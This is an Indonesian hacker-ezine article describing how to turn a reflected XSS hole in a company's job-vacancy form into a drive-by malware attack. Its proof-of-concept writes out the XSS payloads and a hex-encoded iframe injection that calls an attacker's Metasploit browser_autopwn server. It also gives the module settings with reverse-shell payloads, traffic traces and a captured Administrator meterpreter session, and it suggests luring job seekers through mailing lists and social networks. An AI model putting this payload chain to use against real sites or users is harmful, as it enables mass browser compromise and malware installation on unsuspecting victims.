@@ -1,0 +1,450 @@
+                     _|                            _|                      
+   _|_|      _|_|_|  _|_|_|      _|_|    _|_|_|_|      _|_|_|      _|_|    
+ _|_|_|_|  _|        _|    _|  _|    _|      _|    _|  _|    _|  _|_|_|_|  
+ _|        _|        _|    _|  _|    _|    _|      _|  _|    _|  _|        
+   _|_|_|    _|_|_|  _|    _|    _|_|    _|_|_|_|  _|  _|    _|    _|_|_|  
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXII, PHILE 0x006.TXT
+
+Riding the XSS, Spr34c1 t3h Ph34r - Cyberheb 
+cyberheb/at/kecoak-elektronik/dot/net
+
+
+---[ Wassup
+
+So, beberapa minggu terakhir ini saya mencoba untuk mulai mengintip
+teknologi security pada webapss. Mulai dari SQL-Injection, RFI/LFI, HTML
+Injection, XSS, dll. Layaknya seorang newbie yang baru mempelajari
+teknologi tersebut, tentu saja tidak lepas dari beragam aktivitas
+coba-coba, penggunaan beragam tools untuk dipelajari proses internalnya,
+kegagalan, hingga aksi pwned. Dari berbagai percobaan saya menemukan cukup
+banyak masalah XSS pada aplikasi-aplikasi web yang dijadikan target.
+Walaupun tergolong newbie, tapi bukan berarti tidak pernah mendengar
+mengenai vuln jenis ini. 
+
+Banyak sekali yang menganggap remeh jenis hole XSS pada aplikasi web,
+alasannya sederhana...hole tersebut tidak memiliki dampak yang signifikan
+layaknya remote exploit pada sistem operasi, ataupun bug sql-injection yang
+hasil akhirnya dapat memberikan shell. Anggapan remeh selanjutnya
+dikarenakan bug XSS sangat mudah untuk ditemukan, dan permasalahan bug
+tersebut umumnya hanya karena 'kelupaan' melakukan validasi jenis data yang
+di-inputkan oleh user.
+
+Sebagai contoh adalah situs exploit-db.com yang berusaha melanjutkan jaman
+keemasan milw0rm.com, pada link news [1] terdapat kutipan berikut:
+
+"More updates from Steve Tornio. We have changed our submittals policy to
+exclude low impact XSS vulnerabilities. We appreciate the danger XSS
+presents as an attack vector, however we find it impractical to try to
+house every XSS vuln presented to us. We appologise if your XSS
+vulnerabilities dont make it through."
+
+Pernyataan diatas mengindikasikan betapa banyaknya aplikasi web yang
+memiliki celah keamanan XSS dan celah tersebut cenderung lebih mudah
+ditemukan, serta diremehkan :).
+
+
+---[ The risk please?!
+
+Beberapa artikel di internet yang membahas XSS telah memberikan informasi
+mengenai dampak celah keamanan tersebut, salah satunya adalah XSS FAQ [2].
+Pembahasan yang lebih teknikal juga pernah dibahas pada ezine echo
+sebelumnya [3][4][5][6]. 
+
+Resiko yang cukup seru dan berhubungan dengan pencurian data (cookie) dari
+user menggunakan trik XSS baru-baru ini adalah insiden di-hacknya server
+dalam infrastruktur apache[7]. Namun Untuk artikel kali ini saya hanya akan
+membahas satu resiko yang berhubungan dengan inti artikel:
+
+	"XSS dapat menjadi media client-side exploitation."
+	
+Hal ini dapat terjadi karena dengan menggunakan hole XSS penyerang dapat
+menyisipkan kode-kode tertentu kedalam salah satu variable untuk dieksekusi
+oleh target. Contoh paling umum adalah bentuk berikut ini:
+
+http://www.company.co.id/pemesanan/form_id.php?barang=1%3E%3Cb%3EWebsite%20ini%20telah%20di-hacked%3C/b%3E
+
+XSS adalah celah keamanan yang menyerang teknologi client-side, dalam hal
+ini browser yang digunakan oleh target. Sehingga untuk contoh diatas, hasil
+yang ditampilkan akan berbeda-beda tergantung jenis browser internet.
+Bahkan ada kemungkinan XSS akan langsung di-blok apabila target menggunakan
+plugin khusus seperti nocript-nya firefox.
+
+Kode-kode yang dapat disisipkan cukup beragam dan pada beberapa kasus
+keberhasilan ditentukan oleh berbagai parameter. Pada sisa artikel kita
+akan membahas penggunaan kode yang dapat menjadikan celah kemanana XSS
+sebagai media exploitasi berbasis client-side.
+
+
+---[ Client-Side Exploitation
+
+Beberapa waktu yang lalu, G.S menulis tentang salah salah satu crimeware
+jenis client-side exploit pada ezine kecoak elektronik [8]. Crimeware
+tersebut akan menunggu pada suatu domain, ketika target menghubungi domain
+tersebut secara otomatis akan dilakukan analisis jenis browser internet
+yang digunakan serta sistem operasinya untuk kemudian di-exploitasi
+berdasarkan daftar exploit dalam crimeware tools. Pada prinsipnya cara
+kerja crimeware tools ini adalah automatisasi serangan client-side
+exploitation. Dan salah satu hal penting adalah bagaimana memancing korban
+untuk mengunjungi domain crimware tersebut.
+
+Ada beberapa metode, diantaranya: memancing korban menggunakan fake email,
+menggunakan instant messenger, menggunakan social network, hingga cara yang
+lebih 'stealth' dengan memanfaatkan <iframe> yang disusupkan pada halaman
+website. Tentu saja untuk bisa menyisipkan kode <iframe> pada suatu website
+kita harus terlebih dahulu meng-compromise website tersebut, bisa melalui
+sistem operasi, melalui injection pada database, ataupun melalui injection
+pada web tersebut. Intinya adalah penyisipan kode <iframe> membutuhkan
+proses compromise.
+
+
+---[ High Profile v.s Low Profile
+
+Kita dapat mengirimkan link domain suatu crimeware melalui media-media
+email seperti mailing list, namun mungkin tidak begitu banyak yang
+terpancing untuk mengklik link tersebut. Ketika seseorang membaca dari
+mailing list tentang suatu domain yang tidak menarik maka besar kemungkinan
+dia tidak akan meng-klik link tersebut, lain halnya jika domain yang
+ditawarkan berasal dari suatu website dengan kapasitas high profile.
+
+Katakanlah saat ini sedang ada proses penerimaan CPNS suatu departemen
+pemerintahan. Maka kemungkinan target jatuh pada jebakan yang dikirimkan
+via mailing list apabila link yang dikirimkan berasal dari website
+pemerintahan terkait, terlebih lagi jika terdapat link untuk form
+pendaftarannya.
+
+Jika kita tidak bisa meng-compromise website dengan kapasitas high profile,
+maka kita bisa menggunakan hole XSS untuk tujuan serupa.
+
+
+---[ They said, XSS is, lame
+
+Sudah menjadi rahasia umum bahwa banyak orang menganggap XSS bukanlah suatu
+ancaman berarti. Bagi para hacker yang sering berkecimpung dalam hal
+exploitasi sistem, XSS is a joke. Sangat mudah ditemukan dan tidak
+berdampak serius. 
+
+Seorang sysadmin akan mengatakan bahwa dia tidak sebodoh itu untuk
+meng-klik link sembarangan sehingga 'cookies' miliknya tidak dapat tercuri
+apabila ada seseorang yang mencoba untuk menjebaknya. Pihak management
+suatu perusahaan yang kebetulan mengetahui teknikal akan tertawa apabila
+diberitahu bahwa website perusahaannya terdapat hole XSS, walaupun terdapat
+isu bahwa hal ini dapat digunakan untuk menjatuhkan nama perusahaan namun
+umumnya hal tersebut tidak menjamin hole XSS dianggap ancaman serius,
+khususnya di Indonesia.  Alasannya jelas, selama itu hanya berdampak pada
+browser pengguna dan tidak menggangu data dalam server perusahaan, maka
+ancaman XSS bukanlah sesuatu yang berbahaya.
+
+Namun banyak orang mungkin akan berubah pandangan begitu mengetahui bahwa
+XSS dapat menjadi media untuk mengumpulkan tentara cyber (bot), digunakan
+untuk menjebak lebih banyak pengguna komputer untuk menginstall malware
+pada mesin-mesin mereka, digunakan untuk memasukan bot seperti 'zeus' untuk
+mencuri data-data sensitif.
+
+Bagaimana jika skenarionya seperti ini: suatu perusahaan terkemuka membuka
+lowongan pekerjaan dan menyediakan form pendaftaran secara online, form
+tersebut memiliki hole XSS. Hal ini kemudian dimanfaatkan oleh gang hacker
+untuk menyebarkan formulir pendaftaran online tersebut ke berbagai mailing
+list, social network (facebook, twitter, dll), dengan menyisipkan kode-kode
+yang telah di-encode pada bagaian XSS. Masyarakat tetap akan melihat pada
+browser masing-masing formulir pendaftaran yang legitimate, melihat
+tampilan asli website perusahaan terkemuka tersebut, melakukan pendaftaran
+secara normal dan menunggu sesi interview. 
+
+Yang tidak disadari adalah begitu masyarakat meng-klik link tersebut,
+secara diam-diam browser juga melakukan request ke suatu domain dimana
+crimeware telah terinstall dan mengeksploitasi browser korban dengan 0day.
+Dalam sekejap malware terinstall dan gang hacker bisa menikmati panen
+hasilnya tanpa bersusah payah melakukan compromise untuk mendapatkan akses
+pada website perusahaan tersebut yang notabene cukup sulit. Jangan lupa,
+XSS is lame, sehingga hole nya jauh lebih mudah ditemukan, bukan begitu?
+
+
+---[ PoC
+
+Saya harap pada titik ini pembaca telah memahami inti yang ingin
+disampaikan oleh artikel, sehingga tanpa perlu panjang lebar lagi kita akan
+melihat Proof-of-Concept dari paparan informasi diatas.
+
+Suatu website perusahaan ternama yang dipercaya untuk membuat aplikasi
+high-class ternyata memiliki hole XSS pada link vacancy, dan mereka saat
+ini sedang dalam tahap mencari tenaga-tenaga baru untuk join pada
+perusahaan tersebut. Ini adalah contoh real, namun untuk kebaikan semua
+maka nama domain akan disamarkan. Untuk keperluan PoC saya akan menggunakan
+metasploit framework (yeah yeah, as usual), karena dengan metasploit
+pembaca dapat mempraktekan sendiri di rumah (metasploit is free, at least
+until these days :p) dan metasploit dapat memberikan gambaran simulasi
+bagaimana sesungguhnya suatu crimeware beroperasi.
+
+*) Hole XSS:
+www.company.co.id/vacancy/form_id.php?msg=1><script>alert("test")</script>
+
+Metasploit akan di-setup pada suatu alamat IP dan menunggu request pada
+alamat http://10.211.55.14:80/xssrider.
+
+msf auxiliary(browser_autopwn) > show options
+
+Module options:
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   LHOST       10.211.55.14     yes       The IP address to use for
+                                          reverse-connect payloads
+   SRVHOST     10.211.55.14     yes       The local host to listen on.
+   SRVPORT     80               yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming
+                                          connections
+   SSLVersion  SSL3             no        Specify the version of SSL that
+                                          should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH     xssrider         no        The URI to use for this exploit
+                                          (default is random)
+
+msf auxiliary(browser_autopwn) > exploit -j
+[*] Auxiliary module running as background job
+msf auxiliary(browser_autopwn) > 
+
+[*] Starting exploit modules on host 10.211.55.14...
+[*] ---
+
+[*] Starting exploit multi/browser/firefox_escape_retval with payload
+    generic/shell_reverse_tcp
+[*] Using URL: http://10.211.55.14:80/JlScwz
+[*] Server started.
+[*] Starting exploit multi/browser/mozilla_compareto with payload
+    generic/shell_reverse_tcp
+[*] Using URL: http://10.211.55.14:80/oMK9tLh2uoy
+[*] Server started.
+
+...
+...<snip>...
+...
+
+[*] Starting exploit windows/browser/winzip_fileview with payload
+    windows/meterpreter/reverse_tcp
+[*] Using URL: http://10.211.55.14:80/5zwCmalokkoS1Q6
+[*] Server started.
+[*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
+[*] Starting handler for generic/shell_reverse_tcp on port 6666
+[*] Started reverse handler on 10.211.55.14:3333 
+[*] Starting the payload handler...
+[*] Started reverse handler on 10.211.55.14:6666 
+[*] Starting the payload handler...
+
+[*] --- Done, found 15 exploit modules
+
+[*] Using URL: http://10.211.55.14:80/xssrider
+[*] Server started.
+
+
+Request berbentuk 
+
+www.company.co.id/vacancy/form_id.php?msg=1><script>alert("test")</script>
+
+tentu akan membuat korban curiga begitu membaca link tersebut pada suatu
+mailing list, untuk itu umumnya link akan disamarkan menggunakan beberapa
+tehnik, salah satunya adalah tehnik encoding. XSS Cheat Sheet [9] merupakan
+salah satu yang memberikan fasilitas encoding suatu URL. Kita akan merubah
+url yang memanfaatkan XSS untuk memasukan tag <iframe> pada request diatas
+menggunakan HEX encoding.
+
+http://www.company.co.id/vacancy/form_id.php?msg=1><iframe
+src=http://10.211.55.14:80/xssrider></iframe>
+
+
+Di encode menggunakan HEX menjadi:
+
+http://www.company.co.id/vacancy/form_id.php?msg=1%3E%3C%69%66
+%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%31%30%2E%32%31
+%31%2E%35%35%2E%31%34%3A%38%30%2F%78%73%73%72%69%64%65%72%3E%3C
+%2F%69%66%72%61%6D%65%3E
+
+
+Hasil trace menggunakan wireshark menunjukan alur paket seperti berikut
+ini:
+
+GET /vacancy/form_id.php?msg=1%3E%3C%69%66%72%61%6D%65%20%73
+%72%63%3D%68%74%74%70%3A%2F%2F%31%30%2E%32%31%31%2E%35%35%2E
+%31%34%3A%38%30%2F%78%73%73%72%69%64%65%72%3E%3C%2F%69%66%72
+%61%6D%65%3E HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
+Host: www.company.co.id
+Connection: Keep-Alive
+
+
+Request diatas merupakan request full yang dikirimkan oleh browser korban
+pada server target.
+
+HTTP/1.1 200 OK
+Date: Thu, 13 May 2010 03:42:36 GMT
+Server: Apache/2.0.63 (Unix) mod_ssl/2.0.63 OpenSSL/0.9.8e-fips-rhel5
+mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 PHP/5.2.5
+X-Powered-By: PHP/5.2.5
+Content-Length: 4715
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+<script type="text/javascript" language="javascript"
+src="datetimepicker.js"></script>
+<form name="quickapply" method="post" action="applynow.php">
+<font color="red"1><iframe
+src=http://10.211.55.14:80/xssrider></iframe></font><table width="520"
+border="0">
+  <tr>
+    <td width="30%">Kode Posisi </td>
+    <td width="1%">:</td>
+    <td><input type="text" name="data_kodeposisi" maxlength="5" size="5"
+    /></td>
+  </tr>
+  <tr>
+
+...
+...<snip>...
+...
+
+
+Hasil diatas merupakan jawaban atas request sebelumnya. Dapat kita lihat
+bahwa server memberikan dokumen HTML yang diminta layaknya respon normal,
+ditambah dengan tag <iframe>. Browser internet yang menerima dokumen
+tersebut akan berusaha untuk menginterpretasikan data yang didapatkan,
+ketika membaca <iframe> maka browser akan dipaksa untuk mengakses
+http://10.211.55.14/xssrider. 
+
+GET /xssrider HTTP/1.1
+Accept: */*
+Referer: http://www.company.co.id/vacancy/form_id.php?msg=1%3E
+%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%31%30
+%2E%32%31%31%2E%35%35%2E%31%34%3A%38%30%2F%78%73%73%72%69%64%65
+%72%3E%3C%2F%69%66%72%61%6D%65%3E
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
+Host: 10.211.55.14
+Connection: Keep-Alive
+
+
+Request diatas menunjukan secara ekplisit bahwa browser berusaha untuk
+mengakses metasploit. Respon dari request tersebut akan diberikan oleh
+metasploit (browser autopwn) berikut ini:
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 77939
+Server: Apache
+Cache-Control: must-revalidate
+Expires: 0
+Connection: Keep-Alive
+
+<html > <head > <title > Loading </title>
+<script language="javascript" type="text/javascript"><!-- 
+
+...
+...<snip>...
+...
+
+.var version = "";
+.if (window.opera) {
+..yNdDtkFdgLcCetSfXNxtAS = unescape("%4f%70%65%72%61");
+..pmPSJfpogeFsolobbjrquvPEqtEqWNUG = opera.version();
+
+...
+...<snip>...
+...
+
+function exploitMSIE() { 
+ global_exploit_list[global_exploit_list.length] = {
+  'test':'if (!ua_ver_gt(detected_version.pmPSJfpogeFsolobbjrquvPEqtEqWNUG,
+\'6.1\')) { if (testAXO(\'{BD96C556-65A3-11D0-983A-00C04FC29E36}\',
+\'CreateObject\')) { is_vuln = true;}if
+
+...
+...<snip>...
+...
+
+
+Ketika browser korban memiliki hole tertentu dan dapat di eksploitasi oleh
+metasploit, maka kita akan mendapatkan akses shell berikut ini:
+
+
+[*] Using URL: http://10.211.55.14:80/xssrider
+[*] Server started.
+[*] Request '/xssrider' from 10.211.55.2:61681
+[*] Request
+    '/xssrider?sessid=V2luZG93czoyMDAwOlNQMDplbi11czp4ODY6TVNJRTo1LjA6' from
+    10.211.55.2:61681
+[*] JavaScript Report: Windows:2000:SP0:en-us:x86:MSIE:5.0:
+[*] Responding with exploits
+[*] Sending Internet Explorer COM CreateObject Code Execution exploit HTML to
+    10.211.55.2:61681...
+[*] Sending EXE payload to 10.211.55.2:61681...
+[*] Sending stage (748032 bytes) to 10.211.55.2
+[*] Meterpreter session 1 opened (10.211.55.14:3333 -> 10.211.55.2:61686) at
+    Thu May 13 10:42:24 +0700 2010
+
+msf auxiliary(browser_autopwn) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type         Information                                  Connection
+  --  ----         -----------                                  ----------
+  1   meterpreter  RND-2000-PROF\Administrator @ RND-2000-PROF  10.211.55.14:3333 -> 10.211.55.2:61686
+
+msf auxiliary(browser_autopwn) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getprivs 
+============================================================
+Enabled Process Privileges
+============================================================
+  SeDebugPrivilege
+  SeIncreaseQuotaPrivilege
+  SeSecurityPrivilege
+  SeTakeOwnershipPrivilege
+  SeLoadDriverPrivilege
+  SeSystemProfilePrivilege
+  SeSystemtimePrivilege
+  SeProfileSingleProcessPrivilege
+  SeIncreaseBasePriorityPrivilege
+  SeCreatePagefilePrivilege
+  SeBackupPrivilege
+  SeRestorePrivilege
+  SeShutdownPrivilege
+  SeSystemEnvironmentPrivilege
+  SeChangeNotifyPrivilege
+  SeRemoteShutdownPrivilege
+  SeUndockPrivilege
+
+
+---[ Summary
+
+Trik ini tentu saja bukanlah hal yang luar biasa, namun sepertinya masih
+banyak yang belum menyadari bahayanya XSS untuk hal-hal seperti ini. Semoga
+saja dengan adanya artikel ini pihak-pihak yang memiliki hole XSS dapat
+menanggapi dengan lebih serius untuk segera menutup hole tersebut. 
+
+Layaknya sebuah pedang, artikel ini mungkin akan memberikan ide bagi para
+pelaku underground indonesia dengan memanfaatkan hole XSS sebagai metode
+tambahan dalam aktivitas 'iseng' setelah mempertimbangkan banyaknya hole
+XSS yang dapat ditemukan. Saya mengambil resiko tersebut dengan
+pertimbangan informasi ini akan lebih banyak membawa sisi positif (Hail
+pro) daripada sisi negatifnya.
+
+Semoga bermanfaat.
+
+
+---[ Reference
+
+[1] http://www.exploit-db.com/news.php
+[2] http://www.cgisecurity.com/xss-faq.html
+[3] http://ezine.echo.or.id/ezine4/ez-r04-the_day-XSS(example).txt
+[4] http://ezine.echo.or.id/ezine7/ez-r07-az001-shoppingcart.txt
+[5] http://ezine.echo.or.id/ezine8/ez-r08-mrt-eksploitasi_web_dg_XSS.txt
+[6] http://ezine.echo.or.id/ezine21/e21_005.txt
+[7] https://blogs.apache.org/infra/entry/apache_org_04_09_2010
+[8] http://kecoak-elektronik.net/web/fezine/0x06-eleonore.txt
+[9] http://ha.ckers.org/xss.html
+
